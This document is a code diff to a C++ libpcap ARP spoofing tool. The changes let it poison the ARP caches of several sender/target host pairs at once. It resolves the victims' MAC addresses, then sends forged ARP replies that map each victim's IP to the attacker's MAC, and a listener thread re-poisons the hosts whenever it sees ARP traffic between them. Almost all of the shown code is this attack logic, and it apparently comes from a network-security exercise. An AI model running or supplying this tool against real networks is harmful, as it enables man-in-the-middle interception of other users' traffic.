@@ -17,9 +17,12 @@ struct EthArpPacket final {
 };
 
 struct ThreadData {
-   pcap_t* _handle;
-   int _argc;
-   char** _argv;
+   pcap_t* handle;
+   int num;
+   char** sendIP;
+   char** targetIP;
+   Mac* sendmac;
+   Mac* targetmac;
 };
 
 #pragma pack(pop)
@@ -109,7 +112,7 @@ Mac GetSenderMac(pcap_t* handler, char* MyIp, char* MyMac, char* SenderIp) {
    EthArpPacket packet;
    int res;
    //struct libnet_ethernet_hdr* eth;
-
+   
    packet = CreatePacket(Mac(MyMac), Mac("ff:ff:ff:ff:ff:ff"), MyIp, SenderIp, Mac("00:00:00:00:00:00"), true);
    SendPacket(handler, packet);
 
@@ -145,26 +148,29 @@ void SendArp(pcap_t* handle, char* senderIp, Mac mymac, char* targetIp, Mac targ
    printf("target mac  = %s \n", ((std::string)targetMac).c_str());
    printf("my mac = %s \n", ((std::string)mymac).c_str());
    SendPacket(handle, packet);
-   printf("success");
+   printf("success\n");
 }
 
 void* LoopArp(void* data)
 {
    ThreadData threadData = *(ThreadData*)data;
-   pcap_t* handle = threadData._handle;
-   int argc = threadData._argc;
-   char** argv = threadData._argv;
+   pcap_t* handle = threadData.handle;
+   int num = threadData.num;
+   char** sendIP = threadData.sendIP;
+   char** targetIP = threadData.targetIP;
+   Mac* sendmac = threadData.sendmac;
+   Mac* targetmac = threadData.targetmac;
 
    struct pcap_pkthdr* ReplyPacket;
    const u_char* pkt_data;
-   EthArpPacket packet;
+   EthArpPacket packet;   
    int res;
 
    while (1)
    {
       res = pcap_next_ex(handle, &ReplyPacket, &pkt_data);
       if (res == 0) {
-         printf("res == 0");
+         printf("res == 0\n");
          continue;
       }
       if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
@@ -175,24 +181,34 @@ void* LoopArp(void* data)
       struct EthHdr* eth = (struct EthHdr*)(pkt_data);
       struct ArpHdr* ath = (struct ArpHdr*)(pkt_data + 14);
 
-
       if (eth->type_ == htons(EthHdr::Arp))
       {
-         for (int i = 2; i < argc; i++)
+         for (int i = 0; i < num; i++)
          {
-            if ((uint32_t)ath->sip_ == htonl(Ip(argv[i])))
+            if ((uint32_t)ath->sip_ == htonl(Ip(sendIP[i])))
             {
-               for (int j = 2; j < argc; j++)
+               for (int j = 0; j < num; j++)
                {
-                  if ((uint32_t)ath->tip_ == htonl(Ip(argv[j])))
+                  if ((uint32_t)ath->tip_ == htonl(Ip(targetIP[j])))
                   {
-                     Mac targetmac = GetSenderMac(handle, myip, mymac, argv[j]);
-                     SendArp(handle, argv[i], Mac(mymac), argv[j], targetmac);
+                     printf("reply: ");
+                     SendArp(handle, targetIP[j], Mac(mymac), sendIP[i], sendmac[i]);
+                  }
+               }
+            }
+            if ((uint32_t)ath->sip_ == htonl(Ip(targetIP[i])))
+            {
+               for (int j = 0; j < num; j++)
+               {
+                  if ((uint32_t)ath->tip_ == htonl(Ip(sendIP[j])))
+                  {
+                     printf("reply: ");
+                     SendArp(handle, sendIP[j], Mac(mymac), targetIP[i], targetmac[j]);
                   }
                }
             }
          }
-      }
+      }         
    }
 }
 
@@ -201,7 +217,7 @@ int main(int argc, char* argv[]) {
       printf("*Fill in the form*\n");
       usage();
       return -1;
-   }
+   }   
 
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
@@ -216,11 +232,27 @@ int main(int argc, char* argv[]) {
       printf("error");
    }
 
+   int num = (argc - 2)/2;
+   Mac sendmac[num];
+   Mac targetmac[num];
+   char *sendIP[num];
+   char *targetIP[num];
+   for (int m = 2, i = 0; m < argc; m += 2, i++) {
+      sendIP[i] = argv[m];
+      sendmac[i] = GetSenderMac(handle, myip, mymac, argv[m]);
+      targetIP[i] = argv[m + 1];
+      targetmac[i] = GetSenderMac(handle, myip, mymac, argv[m + 1]);
+   }
+
    int status;
    ThreadData threadData;
-   threadData._handle = handle;
-   threadData._argc = argc;
-   threadData._argv = argv;
+   threadData.handle = handle;
+   threadData.num = num;
+   threadData.sendIP = sendIP;
+   threadData.targetIP = targetIP;
+   threadData.sendmac = sendmac;
+   threadData.targetmac = targetmac;
+
    pthread_t p_thread;
    int thr_id = pthread_create(&p_thread, NULL, LoopArp, (void*)&threadData);
    if (thr_id < 0)
@@ -231,14 +263,12 @@ int main(int argc, char* argv[]) {
 
    while (1)
    {
-      for (int m = 2; m < argc; m += 2) {
-         Mac sendmac = GetSenderMac(handle, myip, mymac, argv[m]);
-         Mac targetmac = GetSenderMac(handle, myip, mymac, argv[m + 1]);
-
-         SendArp(handle, argv[m], Mac(mymac), argv[m+1], targetmac);
-         SendArp(handle, argv[m+1], Mac(mymac), argv[m], sendmac);
+      for (int i = 0; i < num; i++) {
+         SendArp(handle, sendIP[i], Mac(mymac), targetIP[i], targetmac[i]);
+         SendArp(handle, targetIP[i], Mac(mymac), sendIP[i], sendmac[i]);
       }
-      sleep(60*5);
+      sleep(1000000);
+      printf("replay\n");
    }
    pcap_close(handle);
    pthread_join(p_thread, (void**)&status);
